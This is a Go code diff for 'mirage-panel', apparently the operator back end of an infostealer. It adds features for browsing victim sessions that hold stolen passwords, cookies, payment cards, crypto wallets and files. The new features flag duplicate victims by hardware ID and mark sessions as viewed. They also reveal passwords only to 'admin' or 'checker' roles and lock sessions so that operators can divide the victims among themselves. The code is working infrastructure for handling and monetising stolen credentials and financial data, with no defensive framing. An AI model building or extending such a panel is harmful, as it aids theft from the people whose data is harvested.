@@ -11,6 +11,7 @@ import (
 	"github.com/go-chi/chi/v5"
 	"github.com/user/mirage-panel/internal/auth"
 	"github.com/user/mirage-panel/internal/db"
+	"github.com/user/mirage-panel/internal/middleware"
 )
 
 var allowedSorts = map[string]string{
@@ -18,6 +19,17 @@ var allowedSorts = map[string]string{
 	"os":         "s.os",
 	"ip":         "s.ip",
 	"country":    "s.country_code",
+}
+
+var walletIcons = map[string]string{
+	"MetaMask": "🦊",
+	"Phantom":  "👻",
+	"Trust":    "🔒",
+	"Coinbase": "🔷",
+	"Exodus":   "📀",
+	"Electrum": "⚡",
+	"Ledger":   "📒",
+	"Trezor":   "🛡️",
 }
 
 type SessionsHandler struct {
@@ -42,23 +54,26 @@ type SessionListItem struct {
 	CardsCount     int    `json:"cards_count"`
 	WalletsCount   int    `json:"wallets_count"`
 	FilesCount     int    `json:"files_count"`
+	Viewed         int    `json:"viewed"`
+	DuplicateCount int    `json:"duplicate_count,omitempty"`
 }
 
 type SessionDetailResponse struct {
-	ID          string          `json:"id"`
-	BuildID     string          `json:"build_id,omitempty"`
-	Hwid        string          `json:"hwid,omitempty"`
-	Os          string          `json:"os,omitempty"`
-	Username    string          `json:"username,omitempty"`
-	Ip          string          `json:"ip,omitempty"`
-	CountryCode string          `json:"country_code,omitempty"`
-	CreatedAt   string          `json:"created_at"`
-	Passwords   []db.Password   `json:"passwords"`
-	Cookies     []db.Cookie     `json:"cookies"`
-	Cards       []db.Card       `json:"cards"`
-	Wallets     []db.Wallet     `json:"wallets"`
-	Files       []db.StolenFile `json:"files"`
-	SystemInfo  *db.SystemInfo  `json:"system_info"`
+	ID          string              `json:"id"`
+	BuildID     string              `json:"build_id,omitempty"`
+	Hwid        string              `json:"hwid,omitempty"`
+	Os          string              `json:"os,omitempty"`
+	Username    string              `json:"username,omitempty"`
+	Ip          string              `json:"ip,omitempty"`
+	CountryCode string              `json:"country_code,omitempty"`
+	CreatedAt   string              `json:"created_at"`
+	Passwords   []db.Password       `json:"passwords"`
+	Cookies     []db.Cookie         `json:"cookies"`
+	Cards       []db.Card           `json:"cards"`
+	Wallets     []db.WalletResponse `json:"wallets"`
+	Files       []db.StolenFile     `json:"files"`
+	SystemInfo  *db.SystemInfo      `json:"system_info"`
+	Viewed      int                 `json:"viewed"`
 }
 
 func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
@@ -76,6 +91,8 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 	if sort == "" {
 		sort = "-created_at"
 	}
+
+	unviewedOnly := r.URL.Query().Get("unviewed_only") == "true"
 
 	var conditions []string
 	var args []any
@@ -96,6 +113,9 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 		like := "%" + q + "%"
 		conditions = append(conditions, "(s.ip LIKE ? OR s.os LIKE ? OR s.username LIKE ? OR s.hwid LIKE ?)")
 		args = append(args, like, like, like, like)
+	}
+	if unviewedOnly {
+		conditions = append(conditions, "(s.viewed IS NULL OR s.viewed = 0)")
 	}
 
 	where := ""
@@ -132,7 +152,7 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 
 	query := fmt.Sprintf(`
 		SELECT s.id, s.build_id, s.hwid, s.os, s.username, s.ip,
-		       s.country_code, s.created_at,
+		       s.country_code, s.created_at, COALESCE(s.viewed, 0),
 		       (SELECT COUNT(*) FROM passwords p WHERE p.session_id = s.id),
 		       (SELECT COUNT(*) FROM cookies c WHERE c.session_id = s.id),
 		       (SELECT COUNT(*) FROM cards c WHERE c.session_id = s.id),
@@ -157,12 +177,17 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 		var item SessionListItem
 		if err := rows.Scan(
 			&item.ID, &item.BuildID, &item.Hwid, &item.Os, &item.Username,
-			&item.Ip, &item.CountryCode, &item.CreatedAt,
+			&item.Ip, &item.CountryCode, &item.CreatedAt, &item.Viewed,
 			&item.PasswordsCount, &item.CookiesCount, &item.CardsCount,
 			&item.WalletsCount, &item.FilesCount,
 		); err != nil {
 			writeError(w, http.StatusInternalServerError, "failed to scan session row")
 			return
+		}
+		if item.Hwid != "" {
+			var dupCount int
+			h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE hwid = ? AND id != ?", item.Hwid, item.ID).Scan(&dupCount)
+			item.DuplicateCount = dupCount
 		}
 		items = append(items, item)
 	}
@@ -194,12 +219,13 @@ func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
 		Ip          string
 		CountryCode string
 		CreatedAt   string
+		Viewed      int
 	}
 	err := h.db.QueryRow(`
-		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
+		SELECT id, build_id, hwid, os, username, ip, country_code, created_at, COALESCE(viewed, 0)
 		FROM sessions WHERE id = ?`, id).Scan(
 		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
-		&s.Ip, &s.CountryCode, &s.CreatedAt,
+		&s.Ip, &s.CountryCode, &s.CreatedAt, &s.Viewed,
 	)
 	if err == sql.ErrNoRows {
 		writeError(w, http.StatusNotFound, "session not found")
@@ -210,12 +236,36 @@ func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	reveal := r.URL.Query().Get("reveal_passwords") == "true"
+	if reveal {
+		claims := middleware.ClaimsFromContext(r.Context())
+		if claims == nil || (claims.Role != "admin" && claims.Role != "checker") {
+			reveal = false
+		}
+	}
+
 	passwords := queryPasswords(h.db, id)
+	if !reveal {
+		for i := range passwords {
+			passwords[i].PasswordValue = "***HIDDEN***"
+		}
+	}
 	cookies := queryCookies(h.db, id)
 	cards := queryCards(h.db, id)
-	wallets := queryWallets(h.db, id)
+	wallets := queryWalletsWithIcons(h.db, id)
 	files := queryFiles(h.db, id)
 	sysInfo := querySystemInfo(h.db, id)
+
+	// Check session lock — hide sensitive data if locked by another
+	claims := middleware.ClaimsFromContext(r.Context())
+	var lockedBy string
+	locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+	if locked && claims != nil && lockedBy != claims.UserID && claims.Role != "admin" {
+		passwords = []db.Password{}
+		cookies = []db.Cookie{}
+		cards = []db.Card{}
+		wallets = []db.WalletResponse{}
+	}
 
 	resp := SessionDetailResponse{
 		ID:          s.ID,
@@ -232,6 +282,7 @@ func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
 		Wallets:     wallets,
 		Files:       files,
 		SystemInfo:  sysInfo,
+		Viewed:      s.Viewed,
 	}
 
 	writeJSON(w, http.StatusOK, resp)
@@ -258,6 +309,23 @@ func (h *SessionsHandler) Delete(w http.ResponseWriter, r *http.Request) {
 	}
 
 	writeJSON(w, http.StatusOK, map[string]string{"message": "session deleted"})
+}
+
+func (h *SessionsHandler) MarkViewed(w http.ResponseWriter, r *http.Request) {
+	id := chi.URLParam(r, "id")
+
+	result, err := h.db.Exec("UPDATE sessions SET viewed = 1 WHERE id = ?", id)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to mark as viewed")
+		return
+	}
+	rows, _ := result.RowsAffected()
+	if rows == 0 {
+		writeError(w, http.StatusNotFound, "session not found")
+		return
+	}
+
+	writeJSON(w, http.StatusOK, map[string]bool{"viewed": true})
 }
 
 func queryPasswords(d *sql.DB, sessionID string) []db.Password {
@@ -317,20 +385,28 @@ func queryCards(d *sql.DB, sessionID string) []db.Card {
 	return result
 }
 
-func queryWallets(d *sql.DB, sessionID string) []db.Wallet {
+func queryWalletsWithIcons(d *sql.DB, sessionID string) []db.WalletResponse {
 	rows, err := d.Query(
 		"SELECT id, session_id, name, path FROM wallets WHERE session_id = ?",
 		sessionID)
 	if err != nil {
-		return []db.Wallet{}
+		return []db.WalletResponse{}
 	}
 	defer rows.Close()
 
-	var result []db.Wallet
+	var result []db.WalletResponse
 	for rows.Next() {
-		var w db.Wallet
+		var w struct {
+			ID, SessionID, Name, Path string
+		}
 		if rows.Scan(&w.ID, &w.SessionID, &w.Name, &w.Path) == nil {
-			result = append(result, w)
+			icon := walletIcons[w.Name]
+			result = append(result, db.WalletResponse{
+				ID:   w.ID,
+				Name: w.Name,
+				Icon: icon,
+				Path: w.Path,
+			})
 		}
 	}
 	return result
@@ -393,6 +469,9 @@ func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Auto-unlock stale locks (>30 min)
+	h.db.Exec("DELETE FROM session_locks WHERE session_id = ? AND locked_at < datetime('now', '-30 minutes')", sessionID)
+
 	var currentLockedBy string
 	err = h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&currentLockedBy)
 	if err == nil {
@@ -443,7 +522,7 @@ func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if lockedBy != claims.UserID {
+	if lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
 	}
